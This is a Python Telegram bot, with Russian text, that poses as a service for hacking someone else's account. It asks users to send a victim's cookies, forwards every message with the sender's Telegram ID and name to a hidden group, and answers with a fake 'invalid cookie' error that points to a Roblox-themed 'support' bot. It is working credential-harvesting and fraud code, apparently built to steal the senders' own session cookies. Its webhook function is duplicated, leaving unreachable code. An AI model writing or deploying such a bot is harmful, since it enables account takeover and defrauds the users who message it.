import os
import telebot
from flask import Flask, request, jsonify
import logging
import time

# ============= НАСТРОЙКА =============
# Получаем переменные окружения (их нужно установить в Render!)
TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
GROUP_ID = os.environ.get('TELEGRAM_GROUP_ID', '-1003396901780')

# Инициализируем бота и Flask-приложение
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Настраиваем логирование
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= ОБРАБОТЧИКИ КОМАНД =============
@bot.message_handler(commands=['start'])
def start_command(message):
    """Обработка команды /start"""
    if message.chat.type != 'private':
        return
    
    # Информация о пользователе
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
    full_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
    
    # Отправляем приветствие пользователю
    bot.send_message(
        message.chat.id,
        "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪\n"
        "❗️НЕ НУЖНО КИДАТЬ НИК ЖЕРТВЫ, ПОСМОТРИТЕ ДОСТАТОЧНО ВИДЕО ТУТОРИАЛ НА НАШЕМ КАНАЛЕ - @s1iuy❗️"
    )
    
    # Отправляем уведомление в группу
    try:
        bot.send_message(
            GROUP_ID,
            f"👤 Кто-то нажал /start\n"
            f"ID: {user_id}\n"
            f"Имя: {full_name}\n"
            f"Юзернейм: {username}\n"
            f"Профиль: tg://user?id={user_id}"
        )
        logger.info(f"/start от {user_id} ({full_name})")
    except Exception as e:
        logger.error(f"Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Обработка всех сообщений"""
    if message.chat.type != 'private':
        return
    
    # Пересылаем всё в группу
    try:
        username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
        bot.send_message(
            GROUP_ID,
            f"📩 Сообщение от: {message.from_user.first_name}\n"
            f"Юзернейм: {username}\n"
            f"ID: {message.from_user.id}\n"
            f"Текст: {message.text}"
        )
        logger.info(f"Сообщение от {message.from_user.id}: {message.text[:50]}...")
    except Exception as e:
        logger.error(f"Ошибка отправки в группу: {e}")
    
    # Если есть WARNING - игнорируем
    if "WARNING" in message.text:
        logger.info(f"Игнорировано (WARNING) от {message.from_user.id}")
        return
    
    # На всё остальное отвечаем ошибкой
    bot.send_message(
        message.chat.id,
        "ошибка❌ пожалуйста, введите действительный куки! если не знаете как его получить обращайтесь в поддержку - @suportrrobloxbot"
    )

# ============= ВЕБХУКИ ДЛЯ RENDER =============
@app.route('/')
def index():
    """Главная страница для проверки работы"""
    return jsonify({
        "status": "Бот работает на Render!",
        "bot_username": bot.get_me().username if TOKEN else "Не настроен",
        "instructions": "Отправьте /start в Telegram-боте"
    }), 200

@app.route('/webhook', methods=['POST'])
@app.route('/webhook', methods=['POST'])
def webhook():
    """Принимаем обновления от Telegram"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        
        # ОБРАБАТЫВАЕМ В ОТДЕЛЬНОМ ПОТОКЕ, чтобы Telegram получил быстрый ответ
        import threading
        thread = threading.Thread(target=bot.process_new_updates, args=([update],))
        thread.start()
        
        return 'OK', 200
    return 'Bad Request', 400
    """Принимаем обновления от Telegram"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bad Request', 400

@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    """Устанавливаем вебхук (вызвать после деплоя)"""
    # Получаем URL из переменной окружения (Render создаёт её автоматически)
    webhook_url = os.environ.get('RENDER_EXTERNAL_URL', '')
    if not webhook_url:
        webhook_url = request.host_url.rstrip('/')
    
    webhook_url = f"{webhook_url}/webhook"
    
    try:
        # Удаляем старый вебхук и ставим новый
        bot.remove_webhook()
        time.sleep(1)
        result = bot.set_webhook(url=webhook_url)
        
        if result:
            return jsonify({
                "success": True,
                "message": f"Вебхук установлен на {webhook_url}",
                "bot_info": bot.get_me().to_dict() if TOKEN else "Токен не настроен"
            }), 200
        else:
            return jsonify({
                "success": False,
                "message": "Ошибка установки вебхука"
            }), 500
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Ошибка: {str(e)}"
        }), 500

@app.route('/health')
def health_check():
    """Проверка здоровья для Render"""
    return jsonify({"status": "healthy"}), 200

# ============= ЗАПУСК =============
if __name__ == '__main__':
    # Для локального тестирования (polling)
    print("🚀 Запускаю бота в режиме polling...")
    bot.remove_webhook()
    bot.polling(none_stop=True)
else:
    # На Render приложение запускается через gunicorn
    logger.info("Приложение готово к работе через вебхуки")
